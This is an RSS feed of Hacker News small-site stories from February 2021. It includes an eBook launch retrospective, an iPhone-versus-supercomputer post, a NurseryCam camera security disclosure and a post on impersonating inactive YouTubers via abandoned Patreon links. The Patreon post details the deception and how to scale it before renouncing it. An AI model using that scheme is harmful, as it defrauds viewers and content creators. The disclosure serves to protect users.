<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 16 Feb 2021 16:50:18 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 16 Feb 2021 16:50:18 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[My first eBook launch ‚Äì results and feedback (10k USD in 27 days)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26140625">thread link</a>) | @alexellisuk
<br/>
February 15, 2021 | https://blog.alexellis.io/my-first-ebook-results-feedback/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/my-first-ebook-results-feedback/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
   <article>

        

        <section>
            <div><p>I wanted to write to you all and share that I've launched my first eBook called <a href="https://gumroad.com/l/serverless-for-everyone-else">"Serverless For Everyone Else"</a> - within the first three hours of launch, nobody bought a single copy and I thought that I'd got it all wrong.</p>
<p>The "everyone else" is a reference to how complicated and difficult cloud-based and Kubernetes-based FaaS has become. The eBook sets out to help indie developers, and individuals within corporations build and deploy functions using a new version of OpenFaaS (<a href="https://github.com/openfaas/faasd">faasd</a>) which is open source and can run on a single VM or VPS without much overhead.</p>
<p>The real power of functions comes in extending existing systems through webhooks, polling, or querying and updating state. I'll share some of these use-cases below including how I used functions to extend how the Gumroad marketplace worked.</p>
<h2 id="whywriteanebookanyway">Why write an eBook anyway?</h2>
<p>Why did I decide to write an eBook? If you've ever written about tech or spoken at a conference, then Packt has probably approached you on LinkedIn about writing for them. From what I hear, that kind of arrangement means writing in a word doc, with tight deadlines and cranking out 300+ pages. It wasn't for me.</p>
<p>I'd seen <a href="https://twitter.com/dvassallo">Daniel Vassallo</a> create an eBook about AWS and Twitter. Daniel had really good results using Gumroad to sell his self-published eBooks. Then there's <a href="https://twitter.com/adamwathan">Adam Wathan</a> who built Tailwind CSS and trained himself up as a UI designer. He wrote his own eBook and in his yearly review mentioned that it did 600k USD in passive sales, without any promotion.</p>
<p>Whilst I didn't expect to get anywhere close to those numbers with a specialist topic, I did want to know if people would buy something from me.</p>
<h2 id="thetiersatlaunch">The tiers at launch</h2>
<p>I launched with three tiers, with names and clear differentiation:</p>
<ul>
<li>Minimalist - 25 USD - just the eBook</li>
<li>DevOps PRO - 50 USD - the eBook, plus a Grafana dashboard and the YAML for faasd to enable it</li>
<li>The learner - 99 USD - the eBook, plus a Grafana dashboard,  the YAML for faasd to enable it and a video workshop ready in 7 days</li>
<li>The team player - the learner, but for 5 people in your company - for a lunch &amp; learn, brownbag, or to better understand Serverless</li>
</ul>
<p>As long as the options add some value, it seems that people are willing to pay a little more and enjoy the choice.</p>
<p>There was no pre-launch and I didn't collect email addresses. I just tweeted about the eBook on Friday afternoon, and then nothing happened for three hours.</p>
<p>I interpreted this as a failure because I'd been reading <a href="https://amzn.to/38N5uZy">"The Right It: Why So Many Ideas Fail and How to Make Sure Yours Succeed"</a>.</p>
<blockquote>
<p>You tend to get what you focus on, like when you think of installing a satellite dish, then realise that everyone on your street has one, and can't stop seeing them.</p>
</blockquote>
<p>In the same way, I saw failure to find market fit. In those first hours I convinced myself that the lack of sales was a sign that nobody wanted the material.</p>
<p>Then I got my first sale, and felt a little relief, maybe I was wrong?</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810538-27b57080-57ed-11eb-905b-d042d3046adf.png" alt="Sale email"></p>
<p>The sales graph had one initial spike on the Friday, and kept going into the Sunday. What had happened? My Twitter audience and <a href="https://github.com/sponsors/alexellis">GitHub Sponsors</a> came to lend their support.</p>
<p><img src="https://pbs.twimg.com/media/ErzMnuOXMAA_REk?format=jpg&amp;name=medium" alt="The initial spike at launch"></p>
<p>Then things died down, and over the course of the week I wondered again if I'd failed to find market fit. <a href="https://gumroad.com/">Gumroad</a> was sending me almost no organic traffic, and nobody was landing on the page from search engines.</p>
<p>Still, it was more money than I had expected to earn from the eBook within the first week, but I felt like with so much interest in OpenFaaS, that there was a broader audience to reach.</p>
<h2 id="gettingasecondpeak">Getting a second peak</h2>
<p>After the first week, I released the video workshop to the people who'd purchased that tier (99USD), and to get some feedback, I offered a free upgrade to the workshop for the tier just below (50USD).</p>
<blockquote>
<p>The discount resulted in another large spike in sales.</p>
</blockquote>
<p><img src="https://camo.githubusercontent.com/4e204e93dcfc33679c997c739fbf4f651fdf268d23961bae6f9b4c25ad4ec145/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f45735a3372753258634155513451673f666f726d61743d6a7067266e616d653d6d656469756d" alt="Video workshop"></p>
<p>Gumroad has no way to offer a discount for a single tier, or to enable upgrades. So how did I fulfil the upgrade?</p>
<p>I did it by writing a function and deploying it to my Raspberry Pi. Gumroad can be configured to send a webhook (also called "a ping") to a HTTPS endpoint whenever there is a sale. My code just had to validate the sender, parse the dollar amount and email address, and then send out an email to the customer. I evaluated a few email services and settled on AWS SES for its simplicity and predictable pricing. I used <a href="https://inlets.dev/blog/2021/02/11/secure-letsencrypt-tunnel.html">inlets PRO</a> to receive webhooks.</p>
<p><img src="https://pbs.twimg.com/media/EscxNxbXAAEHD8z?format=jpg&amp;name=large" alt="The function running"></p>
<p>You can see the source code here: <a href="https://github.com/alexellis/gumroad-responder">alexellis/gumroad-responder</a></p>
<p>After the second peak, I saw a sharp drop-off in sales, again. I started to wonder why I was seeing this pattern?</p>
<p>At that time 99% of referrals had come from Twitter and from email. Had I exhausted my network? Had everyone who was going to buy an eBook on learning open-source serverless, already become a customer?</p>
<p>I went ahead and added a link on <a href="https://www.openfaas.com/">openfaas.com</a> and <a href="https://blog.alexellis.io/">on my blog</a> at the end of each post, to try and get more eyes on the eBook. It's too early to tell if that is going to work out, but has resulted in a few conversions already.</p>
<p>One of the bits of feedback I got on the eBook was how users enjoyed the use-cases, and practical examples. I'd recently started video streaming, so invited a friend to my YouTube channel to talk about serverless use-cases.</p>
<p><img src="https://camo.githubusercontent.com/544dffaf339a4ff44439db1c14cd953de385640b99231688f8a49db61294a02e/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f457378444745505841415968724c4f3f666f726d61743d6a7067266e616d653d6c61726765" alt="Video on use-cases"></p>
<p><a href="https://www.youtube.com/watch?v=mzuXVuccaqI&amp;feature=youtu.be">Watch the recording</a></p>
<p>The recording generated a lot of interest and engagement for existing eBook customers, but seemed to have no obvious effect on sales.</p>
<p>You can get the <a href="https://gist.github.com/alexellis/c72d7a385f801cc9b8deb7fcaa531b69">show notes</a> here which have lots of links for use-cases from hobbyists, indie devs and corporate users of OpenFaaS.</p>
<h2 id="mynextmilestone">My next milestone</h2>
<p>I am pleased with the results so far, and have learned a lot along the way. I also had a few people reach out to me directly asking for help who had taken inspiration from seeing someone actually go ahead and take a calculated risk. As they say, "nothing ventured, nothing gained".</p>
<p>I haven't quite got to 10k USD, which is a nice round number to aim for, but I can roughly understand what each peak means here, and whether they are repeatable.</p>
<p><img src="https://pbs.twimg.com/media/EtARGclXMAg7nJ-?format=jpg&amp;name=medium" alt="Approaching 10k"></p>
<p>Once the sales do cross that threshold, I'll write-up a how to guide and share the command lines and tools I used to generate the eBook.</p>
<h2 id="whatsnext">What's next</h2>
<p>I committed to providing free updates - because the eBook was partially experimental and I wanted to validate that it was useful. Using the <a href="https://slack.openfaas.io/">OpenFaaS Slack</a> helped here - I opened a new channel for people who'd bought the book, and enjoyed the feedback and engagement from this.</p>
<p>Some people charge extra for community, but it felt too hard to enforce the access for this.</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810333-b628f280-57eb-11eb-8be9-a2f6c773346b.png" alt="Original cover"></p>
<p>I generated my own eBook cover originally and then only later, got a professional designer involved.</p>
<p><img src="https://static-2.gumroad.com/res/gumroad/2028406193591/asset_previews/741f2ad46ff0a08e16aaf48d21810ba7/retina/social4.png" alt="New design"></p>
<p>It turns out that the cover may not matter with Gumroad, as long as it's not awful. Since changing cover, I've only seen two new sales.</p>
<p>Now that I have some initial feedback and have learned that people will buy things from me, I want to let goodwill rebuild, and my audience "recover" before launching a second eBook. I've done a lot of free blog posts and writing on Kubernetes, Docker, Golang and Raspberry Pi and analytics from my blog shows me what's popular.</p>
<p>Just because something you give away for free is popular, doesn't mean that anyone will be willing to pay for it. OpenFaaS itself is testament to that, with many corporations using it in production, without contributing code or finances back. Part of <a href="https://blog.alexellis.io/still-in-the-game-my-2020-year-in-review/">my 2021 goals</a> is to find a way to make OpenFaaS sustainable.</p>
<blockquote>
<p>"If You Always Do What You've Always Done, You'll Always Get What You've Always Got." - Henry Ford</p>
</blockquote>
<p>The eBook has already brought in more revenue in a month, than the OpenFaaS GitHub Sponsors account has in a year.</p>
<p><a href="https://amzn.to/38N5uZy">The Right It</a> has taught me not to invest too much effort up front in any one idea, because it is likely to fail. That's just the way things go. Instead I'll be testing ideas out through small experiments that take a few hours or days, and using data to decide whether to invest more.</p>
<p>I'm happy to answer questions <a href="https://twitter.com/alexellisuk/">via Twitter</a>.</p>
<h2 id="update12feb2021">Update (12 Feb 2021)</h2>
<p>It took 27 days, but the eBook has now reached the milestone of 10k USD in sales! Most of the purchases being made now are from links on the OpenFaaS website, the faasd repo or my own blog. This is also known as long-tail, a slow and (mostly) steady stream of revenue.</p>
<p><img src="https://blog.alexellis.io/content/images/2021/02/update-rev6.png" alt="Launch event, offers and longtail"></p>
<blockquote>
<p>Visualised: Launch event, offers and longtail</p>
</blockquote>
<p>I've also released revision 6 of the eBook which has a much more detailed section on CI/CD and recipes for multi-arch builds. I'm using it to deploy endpoints directly to my Raspberry Pi from GitHub Actions.</p>
<p>If you're curious about how Serverless functions can be of use for your next side-project or idea, why not try the eBook and / or video workshop? You can get your money back within 7 days if you're not satisfied.</p>
<p>Events and webhooks can be used to build custom extensions for SaaS products or existing systems. You can see an example in my <a href="https://github.com/alexellis/gumroad-responder">gumroad-responder</a> which forwards messages to Slack, and sends emails via AWS SES to customers during a promotion.</p>
<blockquote>
<p>üéÅ To say thanks for reading, the next 20 people can get 20% off any tier - including the video workshop package using the discount link below:</p>
</blockquote>
<p>Check the options on Gumroad: <a href="https://gumroad.com/l/serverless-for-everyone-else/avid-reader">Serverless For Everyone Else on Gumroad</a></p>
</div>
        </section>

        

    </article>
</div></div>]]>
            </description>
            <link>https://blog.alexellis.io/my-first-ebook-results-feedback/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26140625</guid>
            <pubDate>Mon, 15 Feb 2021 08:55:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Ideas, Through the Looking Glass (PDF, 2005)]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26138218">thread link</a>) | @benhoyt
<br/>
February 14, 2021 | https://people.inf.ethz.ch/wirth/Articles/GoodIdeas_origFig.pdf | <a href="https://web.archive.org/web/*/https://people.inf.ethz.ch/wirth/Articles/GoodIdeas_origFig.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://people.inf.ethz.ch/wirth/Articles/GoodIdeas_origFig.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26138218</guid>
            <pubDate>Mon, 15 Feb 2021 02:00:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Phone vs. Supercomputers]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26138069">thread link</a>) | @ca98am79
<br/>
February 14, 2021 | https://www.tnhh.net/posts/phone-power.html | <a href="https://web.archive.org/web/*/https://www.tnhh.net/posts/phone-power.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Today, I looked up how many <a href="https://en.wikipedia.org/wiki/FLOPS">floating point operations per second</a> (FLOPS) that an iPhone can do. It turns out the A14 chip in the iPhone <a href="https://www.forbes.com/sites/moorinsights/2020/10/15/apple-claims-the-iphone-12s-a14-bionic-challenges-laptops-but-gives-no-details/">can do about 11 TFlOPS according to Apple</a>. Let's give Apple the benefits of the doubt and not get too deep into how they got that number, and put it to perspective and compare the iPhone with the <a href="https://en.wikipedia.org/wiki/History_of_supercomputing">Top 500 Supercomputers</a> in the world over the years:</p>
<p><img src="https://www.tnhh.net/assets/posts-images/iphone-vs-supercomputers.png" alt="iPhone vs Supercomputers"></p>
<p>The green line is how much computing power that little phone I'm holding in my hands has. If released in 2009, it would have made it to the list of top 500 supercomputers in the world! It has more computing power than the most powerful computer in the world in 2002. It has the combined computing power of the 1997's top 500 supercomputers in the whole world.</p>
<p>People talked about how the computer on Appolo was so slow. I get it, but I can hardly relate to that. I wasn't born then. However, 2009 was just 12 years ago. I could still remember it vividly. I was a freshman student then.</p>
<p>Reflecting on that, I figured:</p>
<ul>
<li>Something with the form factor and power envelope of the phone alone is already exceedingly powerful. It could potentially do things that humankind couldn't achieve just ten years ago.</li>
<li>On the other hand, I don't need to have the most whizz-bang computer or phone to make programs that do amazing things. Writing programs for older hardware can be a pleasure. Supporting older hardware makes programs I create more accessible to a larger part of the human population.</li>
<li>As a programmer, when I complain about the phone or any computer I have is not powerful enough for whatever I want to do, it's much more likely it's me doing something wrong.</li>
<li>The world changes faster than my mind conceives. I need to be humble about what I know. Things I know to be fast becomes slow sooner than I expect. In the same realm, maybe ideas that I know to be good become bad sooner than I expect. Those ideas are not necessarily limited to technology: Maybe ideas in science, humanities, and society also envolve that way. It is just harder to put into numbers like TFLOPS.</li>
</ul>
<p>We have the most power computer in our pocket. Doing something amazing with that power should constantly be a question on our mind. All that power just to push one more ads is a fucking stupid and disgusting idea.</p>
<hr>

<hr>
</div></div>]]>
            </description>
            <link>https://www.tnhh.net/posts/phone-power.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26138069</guid>
            <pubDate>Mon, 15 Feb 2021 01:32:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I exploited existing YouTube videos with a fake Patreon profile]]>
            </title>
            <description>
<![CDATA[
Score 150 | Comments 43 (<a href="https://news.ycombinator.com/item?id=26136708">thread link</a>) | @lucas03
<br/>
February 14, 2021 | https://www.lucas03.com/how-i-exploited-existing-youtube-videos-with-a-fake-patreon-profile/ | <a href="https://web.archive.org/web/*/https://www.lucas03.com/how-i-exploited-existing-youtube-videos-with-a-fake-patreon-profile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>I am watching a lot of investing videos on youtube recently. I like to watch them while I eat, or they play in the background while I do something else. I assume that even though I don‚Äôt pay enough attention, interesting info catches my attention. I noticed there are a lot of great videos, and I thought of a way how I could exploit that. In this short text, I‚Äôll try to explain my black hat idea and if it worked.</p>



<p>I was looking for a call/put options youtube videos, as I realized <a href="https://www.lucas03.com/trading212">trading212</a> claims they pay up to 1000$ per registered user. I do invest in <a href="https://www.digrin.com/" target="_blank" title="https://www.digrin.com/">dividend stocks</a> and I like trading212 for that, but there is 0$ commission for referred accounts. I stumbled upon <a href="https://www.youtube.com/watch?v=zoFFD2EGMlg" target="_blank">this video</a> (Investing ‚Äì How I Earn $12 a Month in Dividends EASY!) from 2017 and I noticed a Patreon link there. </p>



<p><img src="https://monosnap.com/image/fb9Ccw7qEsGVYOKATw75W5RlvdRgqF" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>Youtuber <strong>DrUnlimited has 103k subscribers</strong> and the last video was posted 11 months ago. It tells me it‚Äôs an inactive account, and it‚Äôs a shame because some really good old videos are no longer viewed that much.<strong> I noticed patreon link is dead, and that DrUnlimited no longer used Patreon link in his last videos.</strong> That tells me you just tried out Patreon and gave up on it soon after.</p>



<p>Which got me thinking, can this be exploitable? Could I just find similar videos, where there were Patreon links that are no longer in use and I could claim them? I think there must be a tone if they were similar accounts (youtuber tried it in the past, but didn‚Äôt find enough patreons so he abandoned it, but never updated old videos). Well, there is only one way to find out. </p>



<p><strong>I tried to claim techcrackhouse on Patreon</strong>. I never used Patreon, so I was not familiar with the service. I created an account and within few seconds I knew this could work. I created a very simple Patreon page with a screen from the youtube channel within few minutes:</p>



<p><img src="https://monosnap.com/image/tPkZn4IMavztk4I9qaxTyhkSZ1pVYD" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>I tried to do a very simple page. Cover image from youtube, no promises on VIP content or any other upside from being a patreon. The only thing I did, was to add a 3$ a month membership and select ‚Äúgeneral support‚Äù.</p>



<figure><img src="https://monosnap.com/image/VDQAnLvKC6GD7njZ5J9xs15VVlPXEM" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>To publish a Patreon page, I had to write a 100 chars description. I didn‚Äôt want to spend time on it, so you can tell it should not motivate anyone to pay monthly payment:</p>



<p><img src="https://monosnap.com/image/PUxiPW15XghP7kbhcbBcDLPdB4MhlZ" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>That‚Äôs the <a href="https://monosnap.com/file/SFUKzVUGpjO0x7VYVuoW352EXJzXSl" target="_blank">whole patreon page</a>. I was done within half an hour on 31 of January 2021. I did not expect much, but I thought this would be interesting if that works out. And guess what? You won‚Äôt believe what email I got just 2 weeks later, on 13. February 2021:</p>



<p><img src="https://monosnap.com/image/FAxjlJ4yBrUEp9zdkjH1XoGACcZM85" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>It got me thinking how this deceiving tactic can work that easily. <strong>I‚Äôve spent literary 1 hour on it, didn‚Äôt try to do a proper Patreon page and still got to 3$ MRR</strong>. I‚Äôve been developing <a href="https://www.digrin.com/" target="_blank">digrin.com</a> for over 6 years in my free time, and I have just a few paying users. </p>



<p>So, this worked. If I would not mind recycling these old Patreon links from youtube videos, I think that can be a pretty profitable business and it provides monthly income! (I like the subscription model) If I could get a Patreon within 2 weeks after 1 hour of work, what could I get to after spending weeks doing this? What if I find bigger youtube channels? I could write scrapers for youtube (though scraping google is probably not that easy), I could use tools like <a href="https://www.lucas03.com/seoprofiler">seoprofiler</a> to find links to Patreon return 404 and recycle those pages. This plan could be pretty profitable!</p>



<p>But‚Ä¶</p>



<p>I am already sharing this with the world. I might have broken Patreon‚Äôs terms and conditions doing this. <strong>I don‚Äôt want to make money by deceiving people and parasitize on content creators.</strong> So I wrote it down, hope Patreon will block recycling Patreon pages. I‚Äôll put down my fake Patreon page right now and will also refund my single Patreon. Hope your 3$ will find better use!</p>

	</div></div>]]>
            </description>
            <link>https://www.lucas03.com/how-i-exploited-existing-youtube-videos-with-a-fake-patreon-profile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136708</guid>
            <pubDate>Sun, 14 Feb 2021 22:05:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Warning to Users of NurseryCam]]>
            </title>
            <description>
<![CDATA[
Score 134 | Comments 57 (<a href="https://news.ycombinator.com/item?id=26136667">thread link</a>) | @carwyn
<br/>
February 14, 2021 | https://cybergibbons.com/security-2/a-warning-to-users-of-nurserycam/ | <a href="https://web.archive.org/web/*/https://cybergibbons.com/security-2/a-warning-to-users-of-nurserycam/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>This blog post is intended for a less technical audience ‚Äì specifically parents and nurseries using the NurseryCam system.</p>
<p><a href="https://www.nurserycam.co.uk/index.php">NurseryCam</a> is a camera system that is installed in nurseries, allowing parents to view their children remotely. There are <a href="https://www.google.com/search?q=inurl:nursery+nurserycam">tens of nurseries</a> stating that they use this system. News articles go back as far <a href="http://news.bbc.co.uk/1/hi/england/somerset/3569866.stm">as 2004</a>.</p>
<p>Serious security issues have been found in the system. The <a href="https://www.nurserycam.co.uk/web_cam_security.htm">statements that NurseryCam</a> make about the security of their system do not align with reality.</p>
<p>These issues would allow any parent, past or present, to access the video feeds from the nursery. There is also the chance that anyone on the Internet could have accessed them.</p>
<p>I am a full-time security consultant who specialises in the security of the Internet of Things, including camera systems. The issues with NurseryCam are about as serious as it gets. NurseryCam were informed of these as early as February 2015 ‚Äì 6 years ago.</p>
<h2>The System</h2>
<p>A Digital Video Recorder (DVR) is installed in the nursery, connected to cameras. These are like normal CCTV DVRs, used across thousands of businesses and homes in the UK.</p>
<p>The DVR has a web interface that can be viewed in a browser, but it would normally only be possible to view this when you are connected directly to the nursery‚Äôs network. This is because the DVR is behind the router‚Äôs firewall.</p>
<div id="attachment_5044"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw-1024x649.png" alt="" width="646" height="409" srcset="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw-1024x649.png 1024w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw-300x190.png 300w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw-768x487.png 768w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw.png 1030w" sizes="(max-width: 646px) 100vw, 646px"></a></p><p>Without port forwarding,the DVR cannot be accessed.</p></div>
<p>To allow the DVR to be viewed remotely, something called port forwarding is used. This opens a hole in the nursery‚Äôs firewall, allowing the DVR to be accessed from the Internet.</p>
<div id="attachment_5045"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw.png" alt="" width="993" height="632" srcset="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw.png 993w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw-300x191.png 300w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw-768x489.png 768w" sizes="(max-width: 993px) 100vw, 993px"></a></p><p>Port forwarding allows access to the DVR from the Internet</p></div>
<p>To log in to the DVR, you need to know the username, password, and IP address.</p>
<p>When a parent wants to view the cameras, they log in to the NurseryCam website or mobile application. In the background, the parent is given the details for the DVR, including the username and password.</p>
<div id="attachment_5046"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled.png" alt="" width="537" height="434" srcset="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled.png 537w, https://cybergibbons.com/wp-content/uploads/2021/02/Untitled-300x242.png 300w" sizes="(max-width: 537px) 100vw, 537px"></a></p><p>The normal log in procedure for a parent</p></div>
<p>The parent then establishes a direct connection to the DVR, allowing them to view the camera.</p>
<h2>The Issues</h2>
<p>For all parents connecting to a given nursery, they are given the same username and password for the DVR. In the examples I have been shown, the username is <em>admin</em> and the password are obvious words followed by 888.<em><br>
</em></p>
<p>This means that the parents, past and present, have all been given the administrator password for the DVR.</p>
<p>There are no indications that this password changes over time.</p>
<p>There is no need for the parent to login to the NuseryCam website to access the DVR.</p>
<div id="attachment_5047"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled1.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled1.png" alt="" width="283" height="277"></a></p><p>There is no need to login to the NurseryCam servers to login to the DVR</p></div>
<p>With these details, the parent could connect directly to the DVR at any time of the day, view it for however long they want, and view all of the cameras, including ones you have not given them permission to view.</p>
<p>You can lock or delete the parent account on the NurseryCam website, but the username and password for the DVR will not change.</p>
<p>There is no way to stop the parent from logging into the DVR directly.</p>
<p>Anyone logging into the DVR would be seen as the admin user. It would be incredibly difficult for a nursery to determine if the login was from a genuine parent or someone else.</p>
<p>To make matters worse, the connection to the DVR is using HTTP, not HTTPS. It is unencrypted, allowing someone to eavesdrop on the video feed, username, and password.</p>
<h2>The Risks</h2>
<p>Any given parent for a given nursery could login to the DVR and view any and all cameras.</p>
<p>This could include:</p>
<ol>
<li>A current parent viewing cameras for longer than they are meant to.</li>
<li>A current parent viewing cameras that they are not entitled to, such as rooms their child does not use.</li>
<li>A parent whose child no longer attends the nursery viewing the cameras.</li>
<li>Any parent who has been prevented from accessing the system (e.g. separation, abuse) viewing the cameras.</li>
</ol>
<p>Worse still, because the password for the DVRs is common across multiple nurseries and <a href="https://www.google.com/search?q=site%3Anurserycam.co.uk+nurserycam888">openly documented</a> on NurseryCam‚Äôs website, there is the potential for <strong>anyone</strong> on the Internet to access the DVR.</p>
<div id="attachment_5063"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw.png" alt="" width="992" height="909" srcset="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw.png 992w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw-300x275.png 300w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw-768x704.png 768w" sizes="(max-width: 992px) 100vw, 992px"></a></p><p>Port forwarding does not restrict connections to be from parents ‚Äì anyone can access the DVR</p></div>
<p>The only missing piece of the puzzle is the IP address of the nursery. It would be possible to scan the entire of the UK for DVRs using this username and password in a matter of days.</p>
<p>Staff at NurseryCam would know the password and be able to access the DVRs without restriction.</p>
<h2>The Discrepancies</h2>
<p>NurseryCam <a href="https://www.nurserycam.co.uk/web_cam_security.htm">state</a> that their system is ‚Äúsafer than online banking‚Äù.</p>
<p>This is certainly not the case with the system seen here.</p>
<p>A common, shared, and openly documented login for the DVRs is passed to each parent.</p>
<p>There is no encryption used. There are no VPNs.</p>
<p>This is analogous to your local bank giving you the keys to their vault and just trusting that you will only take your money.</p>
<p>The same claims are repeated across multiple nursery websites.</p>
<h2>The Disclosure</h2>
<p>When security researchers find problems like this, we try to report them to the company so that they can be fixed.&nbsp; The aim is to keep users of the system safe. We call this disclosure.</p>
<p>I reported these to NurseryCam on <strong>6th February 2021</strong>.</p>
<p>On <strong>12th February 2021</strong>, I blogged about these initial concerns and Tweeted them.</p>
<p>Former parents reading my Twitter feed got in touch, with one parent confirming that they had informed NurseryCam of almost identical issues in <strong>February 2015</strong> ‚Äì six years ago.</p>
<p>Even six years ago, the claims made about security did not line up with reality.</p>
<p>They have been aware of serious security issues for 6 years and have not fixed them.</p>
<h2>How were these found?</h2>
<p>The NurseryCam Android mobile application was downloaded and then examined. By viewing the code, it was possible to see how the system operates.</p>
<p>Several parent users of the system have contacted me. They confirmed that the system operated as I suspected and that the DVR usernames and passwords were the same each time they logged in.</p>
<p>There has been no attempt to hack NurseryCam webservers.</p>
<p>These issues were trivial to uncover, taking no more than 15 minutes.</p>
<h2>What should you do?</h2>
<p>In my professional opinion, you cannot quickly fix a system that is this badly broken. You also cannot regain the trust that has been lost by selling a product that is described so inaccurately.</p>
<p>If you, as a nursery, operate one of these systems:</p>
<ol>
<li>Unplug the network connection from the DVR.</li>
<li>Contact NurseryCam and ask that they inform all impacted nurseries immediately.</li>
<li>Ask why the system you have been paying for isn‚Äôt the one that is described on the NurseryCam site.</li>
</ol>
<p>If you are a parent, I would advise contacting your nursery and request that they carry out the above steps.</p>
<h2>Inadequate Fixes</h2>
<p>Changing the username and password for the DVR is not a genuine fix ‚Äì the username and password are still sent to the parents.</p>
<p>Adding encryption to the connections is not a fix ‚Äì the username and password are still sent to the parents.</p>
<h2>My Opinion</h2>
<p>These issues are obvious and fundamental. They should not have existed in the first place.</p>
<p>Without the system being almost completely redesigned, it is hard to see how it can be secured adequately.</p>
<p>I have not tested their website, or looked at any of their other security practices.</p>
<p>Ask yourself if you could ever trust this company again with children‚Äôs data.</p>









			</div></div>]]>
            </description>
            <link>https://cybergibbons.com/security-2/a-warning-to-users-of-nurserycam/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136667</guid>
            <pubDate>Sun, 14 Feb 2021 22:00:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What ever happened to scandium bike frames? (2016)]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 51 (<a href="https://news.ycombinator.com/item?id=26136608">thread link</a>) | @dfgdghdf
<br/>
